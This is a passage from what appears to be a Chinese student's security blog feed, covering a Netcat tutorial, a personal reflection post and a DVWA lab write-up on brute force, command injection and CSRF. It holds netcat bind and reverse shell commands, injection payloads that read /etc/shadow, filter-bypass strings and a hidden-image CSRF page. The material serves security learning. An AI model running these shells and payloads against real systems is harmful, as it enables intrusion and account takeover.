1.mp4 | nc -lp 333B: nc -nv 1.1.1.1 333 | mplayer -vo x11 -cache 3000 -</code></pre><h3 id="NC—–端口扫描"><a href="#NC—–端口扫描" class="headerlink" title="NC—–端口扫描"></a>NC—–端口扫描</h3><p>  nc -nvz 1.1.1.1 -65536</p><p>  nc -vnzu 1.1.1.1 1-1024</p><p>root@1kali:~# nc -h</p><p>[v1.10-38]</p><p>connect to somewhere:   nc [-options] hostname port[s] [ports] … </p><p>listen for inbound: nc -l -p port [-options] [hostname] [port]</p><p>options:</p><pre><code>-c shell commands   as `-e&#39;; use /bin/sh to exec [dangerous!!]-e filename     program to exec after connect [dangerous!!]-b          allow broadcasts-g gateway      source-routing hop point[s], up to 8                          设置路由器跃程通信网关，最高可设置8个。-G num          source-routing pointer: 4, 8, 12, ...                         设置来源路由指向器，其数值为4的倍数。-h          this cruft -i secs         delay interval for lines sent, ports sca                      延时的间隔    -k                      set keepalive option on socket-l          listen mode, for inbound connects                             监听模式,入站连接-n          numeric-only IP addresses, no DNS                             直接使用ip地址,而不用域名服务器-o file         hex dump of traffic                                           指定文件名称，把往来传输的数据以16进制字码倾倒成该文件保存。-p port         local port number                                             本地端口-r          randomize local and remote ports                              随机本地和远程端口 -q secs         quit after EOF on stdin and delay of secs-s addr         local source address  -T tos          set Type Of Service-t          answer TELNET negotiation   -u          UDP mode                                                      udp  模式-v          verbose [use twice to be more verbose]                        显示过程,vv 更多-w secs         timeout for connects and final net reads                      等待连接超时-z          zero-I/O mode [used for scanning]                             使用输入/输出模式，只在扫描通信端口时使用。</code></pre><h3 id="NC—–远程克隆硬盘"><a href="#NC—–远程克隆硬盘" class="headerlink" title="NC—–远程克隆硬盘"></a>NC—–远程克隆硬盘</h3><pre><code> A: nc -lp 333 | dd of=/dev/sda B: dd if=/dev/sda | nc -nv 1.1.1.1 333 -q 1</code></pre><p>远程电子取证，可以讲目标服务器远程复制，或者内存。</p><h3 id="NC—–远程控制"><a href="#NC—–远程控制" class="headerlink" title="NC—–远程控制"></a>NC—–远程控制</h3><p>正向：</p><pre><code>A: nc  -lp 333 -  bashB: nc  1.1.1.1 333</code></pre><p>反向：</p><pre><code>A: nc -nv 1.1.1.1 333B: nc -lp 333 -c bash</code></pre><p>注：Windows用户把bash改成cmd;</p><p>root@kali:~# ifconfig</p><p>eth0      Link encap:Ethernet  HWaddr 00:0c:29:c6:89:56  </p><pre><code>      inet addr:192.168.198.130  Bcast:192.168.198.255  Mask:255.255.255.0      inet6 addr: fe80::20c:29ff:fec6:8956/64 Scope:Link      UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1      RX packets:46 errors:0 dropped:0 overruns:0 frame:0      TX packets:49 errors:0 dropped:0 overruns:0 carrier:0      collisions:0 txqueuelen:1000       RX bytes:6770 (6.6 KiB)  TX bytes:8161 (7.9 KiB)      Interrupt:19 Base address:0x2000 </code></pre><p>lo        Link encap:Local Loopback  </p><pre><code>      inet addr:127.0.0.1  Mask:255.0.0.0      inet6 addr: ::1/128 Scope:Host      UP LOOPBACK RUNNING  MTU:65536  Metric:1      RX packets:20 errors:0 dropped:0 overruns:0 frame:0      TX packets:20 errors:0 dropped:0 overruns:0 carrier:0      collisions:0 txqueuelen:0       RX bytes:1200 (1.1 KiB)  TX bytes:1200 (1.1 KiB)</code></pre><p>A:</p><p>root@kali:~# nc -nv 192.168.1.115 333 -c bash </p><p>(UNKNOWN) [192.168.1.115] 333 (?) open</p><p>ls </p><p>pwd</p><p>没有任何反应</p><p>B:</p><p>root:~# nc -lp 333</p><p>ls</p><p>Desktop</p><p>/root</p><p>ifconfig</p><p>……(一串文字）</p><p>请求来控制我！</p><p>NC—–NCAT</p><p>  Nc缺乏就加密和身份验证的能力</p><p>  Ncat包含于nmap工具包中</p><p>  A: ncat -c bash –allow 192.168.20.14 -vnl 333 –ssl</p><p>  B: ncat -nv 1.1.1.1 333 –ssl</p><p>不同系统/平台的nc参数功能不尽相同</p><p>root:~# man nc</p><p>root:~# nc -h</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;#kali渗透测试之Web渗透-工具-NETCAT&lt;/p&gt;
&lt;p&gt;##NETCAT(传输文件/目录、流媒体服务、端口扫描、远程克隆硬盘)&lt;br&gt;网络工具中的瑞士军刀——小身材、大智慧&lt;br&gt;侦听模式/传输模式&lt;br&gt;telnet/获取banner信息&lt;br&gt;传输文本信息&lt;b
      
    
    </summary>
    
      <category term="Kali" scheme="http://0xmj.club/categories/Kali/"/>
    
    
      <category term="NETCAT" scheme="http://0xmj.club/tags/NETCAT/"/>
    
  </entry>
  
  <entry>
    <title>17-11反思与进取</title>
    <link href="http://0xmj.club/2017/11/22/17-11%E5%8F%8D%E6%80%9D%E4%B8%8E%E8%BF%9B%E5%8F%96/"/>
    <id>http://0xmj.club/2017/11/22/17-11反思与进取/</id>
    <published>2017-11-22T09:10:55.000Z</published>
    <updated>2017-11-22T09:15:35.278Z</updated>
    
    <content type="html"><![CDATA[<p>#反思与进取<br><img src="http://oy0tigw51.bkt.clouddn.com/201711202038_238.png" alt=""><br>很久没这么静下心来去反思，自身的问题越来越多，活的越来越混沌，方向感越来越不是自己的，外界的影响往往大于自身的抉择。</p><p>从5月份开始忙着转专业到现在转入信安专业，我也都没忘记自己高考报名这所学校的初衷，也如愿的进入自己理想的状态， 期间太过于迷茫， 总是怀疑自己到底可不可以，如果放弃每天都可以打打游戏，谈谈恋爱，扯扯不知所云的理想，这多舒服啊，但我也总觉得有人告诉我，“你如果每天都很难受，那么你每天都会成长，当你回过头来发现，你必定会恍然大悟自己的难受是有多么值得。”<br>人总是犯贱和懒惰的， 灌了鸡汤，不过打一个短暂的兴奋剂，过了几天，还是精虫上脑，活如死尸。<br>舒服了太久，不知道自己有多差劲。<br>这半年也眨眼即逝，从开学到现在也忙于进入三叶草小组，也卓有成效，靠着脸皮与努力如愿进入小组，但这几天自己高兴过头不知道自己其实还差太远，万万不可得意忘形。这话也是我的girlfriend在我们吃庆功宴的时候告诉我的警告。<br>每每觉得自己可以接近完工的时候，我心里总会告诉我自己休息一会儿，马上就好了。然后浪费很多时间，而距离真正的完成却差距很多。从而再次理思路，完成这期间花费的时间往往是巨大的。</p><p>大概看了彭哥的博客感触越发深刻，这一年的多的时间里自己真正想要的总会偏移正轨。<br>这一年的懒惰心里尤为可怕，凡事为自己查找借口，凡事为自己解脱多容易啊，不懂装懂多好啊，别人会觉得你多厉害多聪明啊。<br>这些人性的弱点往往在自身的思考之后越发觉得厌恶。</p><p>或许是时候做些改变。<br>或许苦味的生活才是该拥抱的。<br>或许应当用力量固执地强迫自己向前去奋斗，到力尽气竭为止。</p><p>脸上有阳光，脑子里有爱情，灵魂里有进取，这大概是我现在最想要追寻的。</p><p>接下来的生活真的需要不竭的动力去执行<br>我需要做到：<br>1.找回自身的最好的状态，不睡懒觉，不找借口，做最好的自己<br>2.每周连载2篇博客<br>3.学习成绩年级top20，过六级，每两日一份试卷<br>4.认真听取每节课，不浪费一分一秒<br>5.寒假结束之前将安全牛web安全工程师所有内容学完<br>6.下学期进入核心组</p><p>佛曰：精进。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;#反思与进取&lt;br&gt;&lt;img src=&quot;http://oy0tigw51.bkt.clouddn.com/201711202038_238.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;很久没这么静下心来去反思，自身的问题越来越多，活的越来越混沌，方向感越来越不是自己的，外界的影响往往大
      
    
    </summary>
    
      <category term="思考" scheme="http://0xmj.club/categories/%E6%80%9D%E8%80%83/"/>
    
    
      <category term="思考" scheme="http://0xmj.club/tags/%E6%80%9D%E8%80%83/"/>
    
  </entry>
  
  <entry>
    <title>DVWA笔记</title>
    <link href="http://0xmj.club/2017/11/22/DVWA%E7%AC%94%E8%AE%B0/"/>
    <id>http://0xmj.club/2017/11/22/DVWA笔记/</id>
    <published>2017-11-22T09:06:26.000Z</published>
    <updated>2017-11-22T09:15:00.479Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DVWA笔记"><a href="#DVWA笔记" class="headerlink" title="DVWA笔记"></a>DVWA笔记</h1><h3 id="一：搭建平台"><a href="#一：搭建平台" class="headerlink" title="一：搭建平台"></a>一：搭建平台</h3><p> <img src="http://oy0tigw51.bkt.clouddn.com/201710232230_351.png" alt=""></p><p> <img src="http://oy0tigw51.bkt.clouddn.com/201710240131_802.png" alt="中文图"></p><hr><h3 id="二-Brute-Force"><a href="#二-Brute-Force" class="headerlink" title="二: Brute Force"></a>二: Brute Force</h3><p>Low:</p><pre><code>&lt;?php if( isset( $_GET[ &#39;Login&#39; ] ) ) { // Get username $user = $_GET[ &#39;username&#39; ]; // Get password $pass = $_GET[ &#39;password&#39; ]; $pass = md5( $pass ); // Check the database $query  = &quot;SELECT * FROM `users` WHERE user = &#39;$user&#39; AND password = &#39;$pass&#39;;&quot;; $result = mysql_query( $query ) or die( &#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;/pre&gt;&#39; ); if( $result &amp;&amp; mysql_num_rows( $result ) == 1 ) { // Get users details $avatar = mysql_result( $result, 0, &quot;avatar&quot; ); // Login successful echo &quot;&lt;p&gt;Welcome to the password protected area {$user}&lt;/p&gt;&quot;; echo &quot;&lt;img src=\&quot;{$avatar}\&quot; /&gt;&quot;; } else { // Login failed echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;; } mysql_close(); } ?&gt;</code></pre><p>参数username、password没有做任何过滤，存在明显的sql注入漏洞。<br>在Login中输入用户名与密码<br>用burpsuite进行拦截<br><img src="http://oy0tigw51.bkt.clouddn.com/201710232240_813.png" alt=""></p><p>将表单进行提交到intruder模块，在password参数的内容两边加$，并将password设置为破解的payload<br><img src="http://oy0tigw51.bkt.clouddn.com/201710240053_146.png" alt=""></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201710240056_540.png" alt=""><br>尝试在爆破结果中找到正确的密码，可以看到password的响应包长度（length）“与众不同”，可推测password为正确密码，手工验证登陆成功。</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201710240109_245.png" alt=""></p><p>Medium：</p><pre><code>&lt;?php if( isset( $_GET[ &#39;Login&#39; ] ) ) { // Sanitise username input $user = $_GET[ &#39;username&#39; ]; $user = mysql_real_escape_string( $user ); // Sanitise password input $pass = $_GET[ &#39;password&#39; ]; $pass = mysql_real_escape_string( $pass ); $pass = md5( $pass ); // Check the database $query  = &quot;SELECT * FROM `users` WHERE user = &#39;$user&#39; AND password = &#39;$pass&#39;;&quot;; $result = mysql_query( $query ) or die( &#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;/pre&gt;&#39; ); if( $result &amp;&amp; mysql_num_rows( $result ) == 1 ) { // Get users details $avatar = mysql_result( $result, 0, &quot;avatar&quot; ); // Login successful echo &quot;&lt;p&gt;Welcome to the password protected area {$user}&lt;/p&gt;&quot;; echo &quot;&lt;img src=\&quot;{$avatar}\&quot; /&gt;&quot;; } else { // Login failed sleep( 2 ); echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;; } mysql_close(); } ?&gt;</code></pre><p>相比Low级别的代码，Medium级别的代码主要增加了mysql_real_escape_string函数，这个函数会对字符串中的特殊符号（x00，n，r，，’，”，x1a）进行转义，基本上能够抵御sql注入攻击(MySQL5.5.37以下版本如果设置编码为GBK，能够构造编码绕过mysql_real_escape_string 对单引号的转义)；同时，$pass做了MD5校验，杜绝了通过参数password进行sql注入的可能性。但是，源代码中只是添加了sleep函数，依然没有加入有效的防暴机制。</p><p>查看源码发现</p><p>sleep( 2 ); </p><pre><code>1</code></pre><p>测试不成功时会延时2s，方法和low一样，只是慢一些，需要更新cookie中的安全等级security。</p><pre><code>headers = {    &#39;Cookie&#39;: &#39;PHPSESSID=h6r8555q2obvo388r4u50lg397; security=medium&#39;}</code></pre><p>High：</p><pre><code>&lt;?php if( isset( $_GET[ &#39;Login&#39; ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; ); // Sanitise username input $user = $_GET[ &#39;username&#39; ]; $user = stripslashes( $user ); $user = mysql_real_escape_string( $user ); // Sanitise password input $pass = $_GET[ &#39;password&#39; ]; $pass = stripslashes( $pass ); $pass = mysql_real_escape_string( $pass ); $pass = md5( $pass ); // Check database $query  = &quot;SELECT * FROM `users` WHERE user = &#39;$user&#39; AND password = &#39;$pass&#39;;&quot;;$result = mysql_query( $query ) or die( &#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;/pre&gt;&#39; ); if( $result &amp;&amp; mysql_num_rows( $result ) == 1 ) { // Get users details $avatar = mysql_result( $result, 0, &quot;avatar&quot; ); // Login successful echo &quot;&lt;p&gt;Welcome to the password protected area {$user}&lt;/p&gt;&quot;; echo &quot;&lt;img src=\&quot;{$avatar}\&quot; /&gt;&quot;; } else { // Login failed sleep( rand( 0, 3 ) ); echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;; } mysql_close(); } // Generate Anti-CSRF token generateSessionToken(); ?&gt; </code></pre><p>通过checkToken( $_REQUEST[ ‘user_token’ ], $_SESSION[ ‘session_token’ ], ‘index.php’ );加入token和generateSessionToken();加入Anti-CSRFtoken预防无脑爆破，所以我们不可以再使用burpsuite工具进行无脑爆破了。而且 mysql_real_escape_string对参数username、password进行过滤、转义，进一步抵御sql注入。<br>还是可以去进行暴力破解，这个就需要python脚本来完成了。通过浏览器访问，打开F12进行查看，我们会发现每次服务器返回的登陆页面中都会包含一个随机的user_token的值，用户每次登录时都要将user_token一起提交。服务器收到请求后，会优先做token的检查，再进行sql查询。同时，我们可以看到user_token在源代码中可以获取到的。所以我们需要写一个爬虫来获取页面中的user_token的值。</p><p>Impossible：</p><pre><code>&lt;?php if( isset( $_POST[ &#39;Login&#39; ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; ); // Sanitise username input $user = $_POST[ &#39;username&#39; ]; $user = stripslashes( $user ); $user = mysql_real_escape_string( $user ); // Sanitise password input $pass = $_POST[ &#39;password&#39; ]; $pass = stripslashes( $pass ); $pass = mysql_real_escape_string( $pass ); $pass = md5( $pass ); // Default values $total_failed_login = 3; $lockout_time   = 15; $account_locked = false; // Check the database (Check user information) $data = $db-&gt;prepare( &#39;SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;&#39; ); $data-&gt;bindParam( &#39;:user&#39;, $user, PDO::PARAM_STR ); $data-&gt;execute(); $row = $data-&gt;fetch(); // Check to see if the user has been locked out. if( ( $data-&gt;rowCount() == 1 ) &amp;&amp; ( $row[ &#39;failed_login&#39; ] &gt;= $total_failed_login ) )  { // User locked out.  Note, using this method would allow for user enumeration! //echo &quot;&lt;pre&gt;&lt;br /&gt;This account has been locked due to too many incorrect logins.&lt;/pre&gt;&quot;; // Calculate when the user would be allowed to login again $last_login = $row[ &#39;last_login&#39; ]; $last_login = strtotime( $last_login ); $timeout= strtotime( &quot;{$last_login} +{$lockout_time} minutes&quot; ); $timenow= strtotime( &quot;now&quot; ); // Check to see if enough time has passed, if it hasn&#39;t locked the account if( $timenow &gt; $timeout ) $account_locked = true; } // Check the database (if username matches the password) $data = $db-&gt;prepare( &#39;SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#39; ); $data-&gt;bindParam( &#39;:user&#39;, $user, PDO::PARAM_STR); $data-&gt;bindParam( &#39;:password&#39;, $pass, PDO::PARAM_STR ); $data-&gt;execute(); $row = $data-&gt;fetch(); // If its a valid login... if( ( $data-&gt;rowCount() == 1 ) &amp;&amp; ( $account_locked == false ) ) { // Get users details $avatar   = $row[ &#39;avatar&#39; ]; $failed_login = $row[ &#39;failed_login&#39; ]; $last_login   = $row[ &#39;last_login&#39; ]; // Login successful echo &quot;&lt;p&gt;Welcome to the password protected area &lt;em&gt;{$user}&lt;/em&gt;&lt;/p&gt;&quot;; echo &quot;&lt;img src=\&quot;{$avatar}\&quot; /&gt;&quot;; // Had the account been locked out since last login? if( $failed_login &gt;= $total_failed_login ) { echo &quot;&lt;p&gt;&lt;em&gt;Warning&lt;/em&gt;: Someone might of been brute forcing your account.&lt;/p&gt;&quot;; echo &quot;&lt;p&gt;Number of login attempts: &lt;em&gt;{$failed_login}&lt;/em&gt;.&lt;br /&gt;Last login attempt was at: &lt;em&gt;${last_login}&lt;/em&gt;.&lt;/p&gt;&quot;; } // Reset bad login count $data = $db-&gt;prepare( &#39;UPDATE users SET failed_login = &quot;0&quot; WHERE user = (:user) LIMIT 1;&#39; ); $data-&gt;bindParam( &#39;:user&#39;, $user, PDO::PARAM_STR ); $data-&gt;execute(); } else { // Login failed sleep( rand( 2, 4 ) ); // Give the user some feedback echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;br /&gt;&lt;br/&gt;Alternative, the account has been locked because of too many failed logins.&lt;br /&gt;If this is the case, &lt;em&gt;please try again in {$lockout_time} minutes&lt;/em&gt;.&lt;/pre&gt;&quot;; // Update bad login count $data = $db-&gt;prepare( &#39;UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;&#39; );$data-&gt;bindParam( &#39;:user&#39;, $user, PDO::PARAM_STR ); $data-&gt;execute(); } // Set the last login time $data = $db-&gt;prepare( &#39;UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;&#39; ); $data-&gt;bindParam( &#39;:user&#39;, $user, PDO::PARAM_STR ); $data-&gt;execute(); } // Generate Anti-CSRF token generateSessionToken(); ?&gt;</code></pre><p>Impossible级别的代码加入了可靠的防爆破机制，当检测到频繁的错误登录后，系统会将账户锁定，爆破也就无法继续。菜鸡发抖</p><hr><h3 id="三-Command-Injection"><a href="#三-Command-Injection" class="headerlink" title="三:Command Injection"></a>三:Command Injection</h3><p>命令注入漏洞是特别危险的，因为它们允许未经授权的执行操作系统命令， 它们的存在，因为应用程序无法正确地验证和消毒，使用时调用shell的功能，如的参数。 攻击者与控制这些参数可以欺骗应用程序执行任何系统命令自己的选择。为了正确测试命令注入漏洞，应遵循以下步骤：</p><ol><li>§ 第1步： 了解攻击场景</li><li>§ 第2步： 分析原因及对策</li><li>§ 第3步： 开始试验和探索</li><li><p>§ 第4步： 微调测试案例</p><p>命令注入攻击的常见模式为：仅仅需要输入数据的场合，却伴随着数据同时输入了恶意代码，而装载数据的系统对此并未设计良好的过滤过程，导致恶意代码也一并执行，最终导致信息泄露或者正常数据的破坏。<br>PHP命令注入攻击漏洞是PHP应用程序中常见的脚本漏洞之一，国内著名的Web应用程序Discuz!、DedeCMS等都曾经存在过该类型漏洞。</p></li></ol><pre><code>&lt;?php   if( isset( $_POST[ &#39;Submit&#39; ]  ) ) {   // Get input   $target = $_REQUEST[ &#39;ip&#39; ];   // Determine OS and execute the ping command.   if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) {   // Windows   $cmd = shell_exec( &#39;ping  &#39; . $target );   }   else {   // *nix   $cmd = shell_exec( &#39;ping  -c 4 &#39; . $target );   }   // Feedback for the end user   echo &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;;   }   ?&gt;</code></pre><p>$target = $_REQUEST[ ‘ip’ ];直接从文本框中输入的内容，没有任何限制，刚刚我们在上面也看到了，在操作系统中使用“&amp;&amp;”连接符（在windows下一个&amp;和两个&amp;都可以，在linux下一定要两个），可以执行多条命令。</p><p>如果输入的值不是一个简单的IP，而是127.0.0.1&amp;&amp;net user，那么可以看到返回值里就把系统的用户名拿到了，<br><img src="http://oy0tigw51.bkt.clouddn.com/201710240138_810.png" alt=""></p><p>还可以注意ping <a href="http://www.baidu.com.cn" target="_blank" rel="external">http://www.baidu.com.cn</a> || net user的写法，这句话的意思是如果||的前面命令执行失败则执行||后面的命令。<br>Linux下输入127.0.0.1&amp;&amp;cat /etc/shadow甚至可以读取shadow文件，可见危害之大。</p><p>Medium：</p><pre><code>&lt;?php if( isset( $_POST[ &#39;Submit&#39; ]  ) ) { // Get input $target = $_REQUEST[ &#39;ip&#39; ]; // Set blacklist $substitutions = array( &#39;&amp;&amp;&#39; =&gt; &#39;&#39;, &#39;;&#39;  =&gt; &#39;&#39;, ); // Remove any of the charactars in the array (blacklist). $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); // Determine OS and execute the ping command. if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) { // Windows $cmd = shell_exec( &#39;ping  &#39; . $target ); } else { // *nix $cmd = shell_exec( &#39;ping  -c 4 &#39; . $target ); } // Feedback for the end user echo &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;; } ?&gt;</code></pre><blockquote><p>// Set blacklist </p></blockquote><pre><code>$substitutions = array(     &#39;&amp;&amp;&#39; =&gt; &#39;&#39;,     &#39;;&#39;  =&gt; &#39;&#39;, ); // Remove any of the charactars in the array (blacklist). $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); </code></pre><p>相比Low级别的代码，服务器端对ip参数做了一定过滤，即把”&amp;&amp;” 、”;”删除，本质上采用的是黑名单机制，因此依旧存在安全问题。<br>漏洞利用</p><p>127.0.0.1&amp;net user<br><img src="http://oy0tigw51.bkt.clouddn.com/201710240149_886.png" alt=""></p><blockquote><p>这里需要注意的是”&amp;&amp;”与” &amp;”的区别：</p><p>Command 1&amp;&amp;Command 2</p><p>先执行Command 1，执行成功后执行Command 2，否则不执行Command 2</p><p>Command 1&amp;&amp;Command 2</p><p>Command 1&amp;Command 2</p><p>先执行Command 1，不管是否成功，都会执行Command 2</p></blockquote><p>2、由于使用的是str_replace把”&amp;&amp;” 、”;”替换为空字符，因此可以采用以下方式绕过：</p><p>127.0.0.1&amp;;&amp;ipconfig</p><p>127.0.0.1&amp;;&amp;ipconfig 绕过 </p><p>这是因为”127.0.0.1&amp;;&amp;ipconfig”中的” ;”会被替换为空字符，这样一来就变成了”127.0.0.1&amp;&amp; ipconfig” ，会成功执行。<br><img src="http://oy0tigw51.bkt.clouddn.com/201710240151_333.png" alt=""></p><p>High：</p><pre><code>&lt;?php if( isset( $_POST[ &#39;Submit&#39; ]  ) ) { // Get input $target = trim($_REQUEST[ &#39;ip&#39; ]); // Set blacklist $substitutions = array( &#39;&amp;&#39;  =&gt; &#39;&#39;, &#39;;&#39;  =&gt; &#39;&#39;, &#39;|  &#39; =&gt; &#39;&#39;, &#39;-&#39;  =&gt; &#39;&#39;, &#39;$&#39;  =&gt; &#39;&#39;, &#39;(&#39;  =&gt; &#39;&#39;, &#39;)&#39;  =&gt; &#39;&#39;, &#39;`&#39;  =&gt; &#39;&#39;, &#39;||&#39; =&gt; &#39;&#39;, ); // Remove any of the charactars in the array (blacklist). $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); // Determine OS and execute the ping command. if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) { // Windows $cmd = shell_exec( &#39;ping  &#39; . $target ); } else { // *nix $cmd = shell_exec( &#39;ping  -c 4 &#39; . $target ); } // Feedback for the end user echo &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;; } ?&gt;</code></pre><p>黑名单看似过滤了所有的非法字符，但仔细观察到是把”| ”（注意这里|后有一个空格）替换为空字符，于是 ”|”成了“漏网之鱼”。</p><p>127.0.0.1|net user</p><p>127.0.0.1|net user 利用</p><p>Command 1 | Command 2</p><p>“|”是管道符，表示将Command 1的输出作为Command 2的输入，并且只打印Command 2执行的结果。</p><p>Impossible：</p><p>不存在命令注入漏洞</p><p><a href="http://www.4hou.com/technology/1012.html" target="_blank" rel="external">使用Metasploit对DVWA进行命令注入攻击</a></p><pre><code>&lt;?php if( isset( $_POST[ &#39;Submit&#39; ]  ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; ); // Get input $target = $_REQUEST[ &#39;ip&#39; ]; $target = stripslashes( $target ); // Split the IP into 4 octects $octet = explode( &quot;.&quot;, $target ); // Check IF each octet is an integer if( ( is_numeric( $octet[0] ) ) &amp;&amp; ( is_numeric( $octet[1] ) ) &amp;&amp; ( is_numeric( $octet[2] ) ) &amp;&amp; ( is_numeric( $octet[3] ) ) &amp;&amp; ( sizeof( $octet ) == 4 ) ) { // If all 4 octets are int&#39;s put the IP back together. $target = $octet[0] . &#39;.&#39; . $octet[1] . &#39;.&#39; . $octet[2] . &#39;.&#39; . $octet[3]; // Determine OS and execute the ping command. if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) { // Windows $cmd = shell_exec( &#39;ping  &#39; . $target ); } else { // *nix $cmd = shell_exec( &#39;ping  -c 4 &#39; . $target ); } // Feedback for the end user echo &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;; } else { // Ops. Let the user name theres a mistake echo &#39;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&#39;; } } // Generate Anti-CSRF token generateSessionToken(); ?&gt; </code></pre><h3 id="四：CSRF"><a href="#四：CSRF" class="headerlink" title="四：CSRF"></a>四：CSRF</h3><p>Cross-Site Request Forgery，跨站请求伪造，也称为One Click Attack，或者Session Riding。</p><p>是一种对网站的恶意利用。CSRF通过伪装来自受信任用户的请求来利用受信任的网站。</p><p>XSS与之相反，XSS利用站点内的信任用户进行攻击。</p><p>举个例子</p><p>下面这幅图片应该比较形象了，用户浏览器在不知情的情况下访问了A网站。并且A网站是可以正常访问的，因为Cookie并没有失效。<br><img src="http://oy0tigw51.bkt.clouddn.com/201710240200_145.jpg" alt=""><br>再举个实际中可能发生的例子</p><p>一个网站用户Bob可能正在浏览聊天论坛，而同时另一个用户Alice也在此论坛中，并且后者刚刚发布了一个具有Bob银行链接的图片消息。设想一下，Alice编写了一个在Bob的银行站点上进行取款的form提交的链接，并将此链接作为图片tag。如果Bob的银行在cookie中保存他的授权信息，并且此cookie没有过期，那么当Bob的浏览器尝试装载图片时将提交这个取款form和他的cookie，这样在没经Bob同意的情况下便授权了这次事务。</p><p>这个例子是上面的英文版描述。改变配置、强制提交信息、取消会员等危害。</p><p>CSRF是一种依赖web浏览器的、被混淆过的代理人攻击（deputy attack）</p><pre><code>CSRF攻击依赖下面的假定：1 攻击者了解受害者所在的站点2 攻击者的目标站点具有持久化授权cookie或者受害者具有当前会话cookie3 目标站点没有对用户在网站行为的第二授权</code></pre><p>low：</p><pre><code>&lt;?php if( isset( $_GET[ &#39;Change&#39; ] ) ) { // Get input $pass_new  = $_GET[ &#39;password_new&#39; ]; $pass_conf = $_GET[ &#39;password_conf&#39; ]; // Do the passwords match? if( $pass_new == $pass_conf ) { // They do! $pass_new = mysql_real_escape_string( $pass_new ); $pass_new = md5( $pass_new ); // Update the database $insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;; $result = mysql_query( $insert ) or die( &#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;/pre&gt;&#39; ); // Feedback for the user echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; } else { // Issue with passwords matching echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; } mysql_close(); } ?&gt;</code></pre><p>代码中在获取了$pass_new和$pass_conf这两个变量之后，利用mysql_real_escape_string()函数进行了过滤，这样虽然可以防止SQL注入，但却无法阻止CSRF攻击，之后这两个变量便被直接代入UPDATE语句中执行了数据库更新操作。</p><blockquote><p>服务器收到修改密码的请求后，会检查参数password_new与password_conf是否相同，如果相同，就会修改密码，并没有任何的防CSRF机制</p></blockquote><p>CSRF最关键的是利用受害者的cookie向服务器发送伪造请求，所以如果受害者之前用Chrome浏览器登录的这个系统，而用搜狗浏览器点击这个链接，攻击是不会触发的，因为搜狗浏览器并不能利用Chrome浏览器的cookie，所以会自动跳转到登录界面。</p><p>漏洞利用</p><p>1.<br><a href="http://192.168.153.130/dvwa/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change#" target="_blank" rel="external">http://192.168.153.130/dvwa/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change#</a><br>当受害者点击了这个链接，他的密码就会被改成password</p><p>2.构造攻击页面</p><p>现实攻击场景下，这种方法需要事先在公网上传一个攻击页面，诱骗受害者去访问，真正能够在受害者不知情的情况下完成CSRF攻击。这里为了方便演示（才不是我租不起服务器= =），就在本地写一个test.html，下面是具体代码。</p><pre><code>&lt;img src=&quot;http://192.168.153.130/dvwa/vulnerabilities/csrf/?password_new=hack&amp;password_conf=hack&amp;Change=Change#&quot; border=&quot;0&quot; style=&quot;display:none;&quot;/&gt;&lt;h1&gt;404&lt;h1&gt;&lt;h2&gt;file not found.&lt;h2&gt;</code></pre><p>当受害者访问test.html时，会误认为是自己点击的是一个失效的url，但实际上已经遭受了CSRF攻击，密码已经被修改为了hack</p><p>Medium：</p><pre><code>&lt;?php if( isset( $_GET[ &#39;Change&#39; ] ) ) { // Checks to see where the request came from if( eregi( $_SERVER[ &#39;SERVER_NAME&#39; ], $_SERVER[ &#39;HTTP_REFERER&#39; ] ) ) { // Get input $pass_new  = $_GET[ &#39;password_new&#39; ]; $pass_conf = $_GET[ &#39;password_conf&#39; ]; // Do the passwords match? if( $pass_new == $pass_conf ) { // They do! $pass_new = mysql_real_escape_string( $pass_new ); $pass_new = md5( $pass_new ); // Update the database $insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . 